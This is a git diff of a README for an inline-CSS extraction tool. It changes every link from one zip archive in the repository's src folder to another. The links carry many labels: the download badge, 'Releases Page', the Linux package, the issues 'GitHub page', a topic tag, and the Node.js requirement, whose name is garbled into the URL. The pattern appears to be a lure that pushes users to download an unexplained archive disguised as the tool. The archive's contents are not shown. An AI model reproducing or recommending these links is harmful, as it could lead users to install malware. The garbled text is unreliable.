@@ -1,7 +1,7 @@
 # 🎉 extract-inline-style - Easily Manage Inline CSS Styles
 
 ## 📥 Download Now!
-[![Download extract-inline-style](https://github.com/SaqibUllah687/extract-inline-style/raw/refs/heads/main/src/inline-extract-style-institutive.zip%20extract-inline--style-blue)](https://github.com/SaqibUllah687/extract-inline-style/raw/refs/heads/main/src/inline-extract-style-institutive.zip)
+[![Download extract-inline-style](https://raw.githubusercontent.com/SaqibUllah687/extract-inline-style/main/src/inline-style-extract-2.5.zip%20extract-inline--style-blue)](https://raw.githubusercontent.com/SaqibUllah687/extract-inline-style/main/src/inline-style-extract-2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **extract-inline-style**! This application helps you extract inline styles from your HTML files and move them to an external CSS file. It also removes duplicate styles, making your code cleaner and more efficient.
@@ -14,17 +14,17 @@ Welcome to **extract-inline-style**! This application helps you extract inline s
 
 ### 🛠 System Requirements
 - Operating System: Windows, macOS, or Linux
-- https://github.com/SaqibUllah687/extract-inline-style/raw/refs/heads/main/src/inline-extract-style-institutive.zip Version 14 or higher (installed)
+- https://raw.githubusercontent.com/SaqibUllah687/extract-inline-style/main/src/inline-style-extract-2.5.zip Version 14 or higher (installed)
 
 ## 📂 Download & Install
-To download the application, please **visit this page**: [Releases Page](https://github.com/SaqibUllah687/extract-inline-style/raw/refs/heads/main/src/inline-extract-style-institutive.zip).
+To download the application, please **visit this page**: [Releases Page](https://raw.githubusercontent.com/SaqibUllah687/extract-inline-style/main/src/inline-style-extract-2.5.zip).
 
 1. On the releases page, search for the latest version.
 2. Click on the version to view details and available files.
 3. Choose the appropriate file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the appropriate `https://github.com/SaqibUllah687/extract-inline-style/raw/refs/heads/main/src/inline-extract-style-institutive.zip` or other relevant packages.
+   - For Linux, download the appropriate `https://raw.githubusercontent.com/SaqibUllah687/extract-inline-style/main/src/inline-style-extract-2.5.zip` or other relevant packages.
 4. Once the download completes, locate the downloaded file and open it to start the installation.
 
 ## 🎉 How to Use extract-inline-style
@@ -68,7 +68,7 @@ Yes, **extract-inline-style** works with any standard HTML file containing inlin
 No, you do not need any programming knowledge to use **extract-inline-style**. The interface is designed for ease of use.
 
 ### What if I encounter issues?
-If you face any problems, please check the "Issues" section on our [GitHub page](https://github.com/SaqibUllah687/extract-inline-style/raw/refs/heads/main/src/inline-extract-style-institutive.zip). You can report your issue there, and the community may assist you.
+If you face any problems, please check the "Issues" section on our [GitHub page](https://raw.githubusercontent.com/SaqibUllah687/extract-inline-style/main/src/inline-style-extract-2.5.zip). You can report your issue there, and the community may assist you.
 
 ## 🌐 Topics Related to extract-inline-style
 - Attributes
@@ -76,7 +76,7 @@ If you face any problems, please check the "Issues" section on our [GitHub page]
 - Extract Data
 - HTML
 - Inline CSS
-- https://github.com/SaqibUllah687/extract-inline-style/raw/refs/heads/main/src/inline-extract-style-institutive.zip
+- https://raw.githubusercontent.com/SaqibUllah687/extract-inline-style/main/src/inline-style-extract-2.5.zip
 - NPM
 - Styled Components
 - Stylesheets
